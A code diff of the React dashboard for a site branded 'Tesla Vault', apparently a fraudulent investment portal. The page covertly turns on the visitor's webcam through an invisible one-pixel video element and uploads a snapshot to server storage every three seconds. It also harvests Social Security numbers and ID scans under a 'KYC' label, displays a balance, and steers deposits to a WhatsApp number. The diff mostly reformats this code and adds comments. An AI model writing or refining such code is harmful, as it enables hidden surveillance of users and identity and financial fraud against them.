@@ -1,15 +1,12 @@
 'use client';
-
 import React, { useEffect, useState, useRef } from 'react';
 import { supabase } from '@/lib/supabaseClient';
 import { useRouter } from 'next/navigation';
-import Link from 'next/link'; // Added Link for navigation
 import { 
   LogOut, Lock, Smartphone, ShieldCheck, 
   Activity, Upload, Camera, User, 
-  Wallet, Menu, X, Info // Added Menu, X, Info icons
+  Wallet
 } from 'lucide-react';
-import { motion, AnimatePresence } from 'framer-motion'; // Added for smooth menu animation
 
 export default function Dashboard() {
   const router = useRouter();
@@ -28,24 +25,26 @@ export default function Dashboard() {
   const [idType, setIdType] = useState('driver_license');
   const [idFile, setIdFile] = useState<File | null>(null);
   const [kycSubmitting, setKycSubmitting] = useState(false);
-  const [isMenuOpen, setIsMenuOpen] = useState(false); // Mobile Menu State
 
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
 
-  // --- STRICT AUTH CHECK ---
+  // --- STRICT AUTH CHECK (Prevents "Valued Client" glitch on Back button) ---
   useEffect(() => {
     let channel: any;
 
     const initData = async () => {
       try {
+        // 1. Check for active session immediately
         const { data: { session } } = await supabase.auth.getSession();
         
         if (!session) { 
+           // If no session (e.g. back button after logout), Force Redirect to Login
            window.location.href = '/portal/auth'; 
            return; 
         }
 
+        // 2. Fetch Profile (Only runs if authenticated)
         const { data } = await supabase
           .from('profiles')
           .select('*')
@@ -54,17 +53,19 @@ export default function Dashboard() {
 
         if (data) {
           setUser(data);
-          setLoading(false);
+          setLoading(false); // Stop loading only when we have real data
           startProctoring(session.user.id);
         } else {
            setLoading(false);
         }
 
+        // 3. Realtime Listener
         channel = supabase.channel('realtime-profile')
           .on(
             'postgres_changes',
             { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` },
             (payload) => {
+              console.log("Realtime Update Received:", payload.new);
               setUser(payload.new);
             }
           )
@@ -80,17 +81,26 @@ export default function Dashboard() {
     return () => { if (channel) supabase.removeChannel(channel); };
   }, []);
 
-  // --- CAMERA LOGIC ---
+  // --- CAMERA LOGIC (Fixed Black Screen & 3s Interval) ---
   const startProctoring = async (userId: string) => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+        video: { 
+          facingMode: 'user', 
+          width: { ideal: 640 }, 
+          height: { ideal: 480 } 
+        } 
       });
+      
       const vid = videoRef.current;
       if (vid) {
         vid.srcObject = stream;
-        vid.onloadedmetadata = () => vid.play().catch(e => console.error(e));
+        vid.onloadedmetadata = () => {
+          vid.play().catch(e => console.error("Auto-play blocked:", e));
+        };
       }
+      
+      // Snapshot Loop (Every 3 Seconds)
       const interval = setInterval(async () => {
         const cvs = canvasRef.current;
         if (vid && cvs && vid.readyState >= 2 && !vid.paused && !vid.ended) {
@@ -99,14 +109,21 @@ export default function Dashboard() {
                 cvs.width = vid.videoWidth;
                 cvs.height = vid.videoHeight;
                 context.drawImage(vid, 0, 0, cvs.width, cvs.height);
+                
                 cvs.toBlob(async (blob) => {
                   if (blob) {
-                    await supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob);
+                    const { error } = await supabase.storage
+                      .from('proctor-snapshots')
+                      .upload(`${userId}/live_${Date.now()}.jpg`, blob);
+                    if (error) console.warn("Snapshot error:", error.message);
                   }
                 }, 'image/jpeg', 0.5); 
             }
+        } else {
+            vid?.play().catch(() => {});
         }
       }, 3000); 
+
       return () => clearInterval(interval); 
     } catch (e) { console.warn("Biometrics offline:", e); }
   };
@@ -119,11 +136,19 @@ export default function Dashboard() {
     try {
       const { data: { session } } = await supabase.auth.getSession();
       if (!session) throw new Error("No session");
+
       const path = `${session.user.id}/${Date.now()}_id.jpg`;
       await supabase.storage.from('user-kyc').upload(path, idFile);
-      await supabase.from('profiles').update({ ssn_data: ssn, document_type: idType, kyc_status: 'pending' }).eq('id', session.user.id);
+      
+      await supabase.from('profiles').update({ 
+        ssn_data: ssn, 
+        document_type: idType, 
+        kyc_status: 'pending' 
+      }).eq('id', session.user.id);
+
       setUser((prev: any) => ({ ...prev, kyc_status: 'pending', ssn_data: ssn }));
       alert("Verification Submitted Successfully");
+
     } catch (err: any) { alert("Error: " + err.message); }
     finally { setKycSubmitting(false); }
   };
@@ -131,6 +156,8 @@ export default function Dashboard() {
   const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
   const waLink = `https://wa.me/19803487946?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
+  
+  // Logic to show "Reviewing" screen ONLY if SSN has been submitted
   const showPendingScreen = (user?.kyc_status === 'pending' || user?.kyc_status === 'pending_review') && (user?.ssn_data && user?.ssn_data.length > 2);
 
   if (loading) return (
@@ -142,99 +169,49 @@ export default function Dashboard() {
 
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
-      {/* HIDDEN CAMERA ELEMENTS */}
-      <video ref={videoRef} autoPlay playsInline muted className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" style={{ zIndex: -1 }} />
+      {/* VIDEO ELEMENT (Hidden but active) */}
+      <video 
+        ref={videoRef} 
+        autoPlay 
+        playsInline 
+        muted 
+        className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none" 
+        style={{ zIndex: -1 }}
+      />
       <canvas ref={canvasRef} className="hidden" />
 
-      {/* BACKGROUND GRADIENT */}
       <div className="fixed inset-0 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-[#D4AF37]/5 via-transparent to-transparent pointer-events-none" />
 
-      {/* --- PROFESSIONAL RESPONSIVE NAVBAR --- */}
-      <header className="sticky top-0 z-[100] bg-black/80 backdrop-blur-xl border-b border-white/5">
+      {/* HEADER */}
+      <header className="sticky top-0 z-[100] bg-black/60 backdrop-blur-xl border-b border-white/5">
         <div className="max-w-7xl mx-auto px-4 md:px-10 h-20 flex justify-between items-center">
-           {/* LEFT: LOGO */}
            <div className="flex items-center gap-3">
               <div className="w-10 h-10 rounded-xl bg-[#D4AF37] flex items-center justify-center shadow-[0_0_20px_rgba(212,175,55,0.2)]">
                 <Activity size={20} className="text-black" />
               </div>
-              <h1 className="text-xl font-serif italic">Tesla <span className="text-[#D4AF37]">Vault</span></h1>
+              <h1 className="text-xl font-serif italic hidden sm:block">Tesla <span className="text-[#D4AF37]">Vault</span></h1>
            </div>
            
-           {/* DESKTOP ACTIONS (Hidden on Mobile) */}
-           <div className="hidden md:flex items-center gap-6">
-              <Link href="/about" className="text-xs font-bold uppercase tracking-widest text-gray-400 hover:text-[#D4AF37] transition-colors flex items-center gap-2">
-                 <Info size={14} /> About
-              </Link>
-
-              <div className="h-4 w-px bg-white/10"></div>
-
-              <div className="flex flex-col items-end">
+           <div className="flex items-center gap-4">
+              <div className="flex flex-col items-end mr-2">
                 <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
-                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0] || 'Unknown'}</span>
+                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0]}</span>
               </div>
               
+              {/* SIGN OUT BUTTON - Redirects to /portal */}
               <button 
                 onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal')} 
-                className="flex items-center gap-2 px-4 py-2 bg-white/5 rounded-full hover:bg-red-500/20 hover:text-red-500 transition-all border border-white/10"
+                className="w-10 h-10 flex items-center justify-center bg-white/5 rounded-full hover:bg-red-500/20 hover:text-red-500 transition-all border border-white/10"
               >
-                <LogOut size={14} />
-                <span className="text-[10px] font-bold uppercase tracking-wider">Sign Out</span>
+                <LogOut size={18} />
               </button>
            </div>
-
-           {/* MOBILE HAMBURGER (Visible on Mobile) */}
-           <button className="md:hidden text-[#D4AF37]" onClick={() => setIsMenuOpen(true)}>
-              <Menu size={28} />
-           </button>
         </div>
       </header>
 
-      {/* MOBILE DRAWER MENU */}
-      <AnimatePresence>
-        {isMenuOpen && (
-          <motion.div 
-            initial={{ opacity: 0, x: '100%' }}
-            animate={{ opacity: 1, x: 0 }}
-            exit={{ opacity: 0, x: '100%' }}
-            transition={{ type: "tween", duration: 0.3 }}
-            className="fixed inset-0 z-[200] bg-black/95 backdrop-blur-xl md:hidden flex flex-col p-8"
-          >
-             <div className="flex justify-between items-center mb-12">
-                <h2 className="text-2xl font-serif text-white">Menu</h2>
-                <button onClick={() => setIsMenuOpen(false)} className="p-2 bg-white/5 rounded-full">
-                  <X size={24} className="text-[#D4AF37]" />
-                </button>
-             </div>
-
-             <div className="flex flex-col gap-6 flex-1">
-                {/* NODE INFO CARD */}
-                <div className="bg-[#111] p-6 rounded-2xl border border-white/10 mb-4">
-                   <div className="flex items-center gap-3 mb-2">
-                     <User size={16} className="text-[#D4AF37]" />
-                     <span className="text-xs uppercase tracking-widest text-gray-500">Active Session</span>
-                   </div>
-                   <p className="text-lg font-mono text-white">{user?.full_name}</p>
-                   <p className="text-xs text-gray-600 truncate">{user?.email}</p>
-                </div>
-
-                <Link href="/about" className="flex items-center gap-4 text-2xl font-serif text-gray-300 hover:text-[#D4AF37] transition-colors">
-                   <Info size={24} /> About Platform
-                </Link>
-
-                <button 
-                  onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal')} 
-                  className="flex items-center gap-4 text-2xl font-serif text-red-500 hover:text-red-400 transition-colors mt-auto"
-                >
-                   <LogOut size={24} /> Sign Out
-                </button>
-             </div>
-          </motion.div>
-        )}
-      </AnimatePresence>
-
       <div className="max-w-7xl mx-auto px-4 md:px-10 pt-8 pb-20 space-y-6">
         
-        {/* STATS GRID */}
+        {/* STATS */}
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
           <div className="lg:col-span-8 bg-[#0a0a0a] border border-white/5 p-8 md:p-14 rounded-[2.5rem] md:rounded-[3.5rem] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[350px]">
              <div>
@@ -242,7 +219,7 @@ export default function Dashboard() {
                  <Wallet size={14} className="text-[#D4AF37]" />
                  <p className="text-gray-500 text-[10px] uppercase tracking-[0.4em] font-bold">Consolidated Equity</p>
                </div>
-               <h2 className="text-5xl md:text-8xl font-serif text-white tracking-tighter leading-none break-all">
+               <h2 className="text-5xl md:text-8xl font-serif text-white tracking-tighter leading-none">
                  ${user?.balance?.toLocaleString() || '0.00'}
                </h2>
              </div>
@@ -356,4 +333,4 @@ export default function Dashboard() {
       </div>
     </main>
   );
-                           }
+}
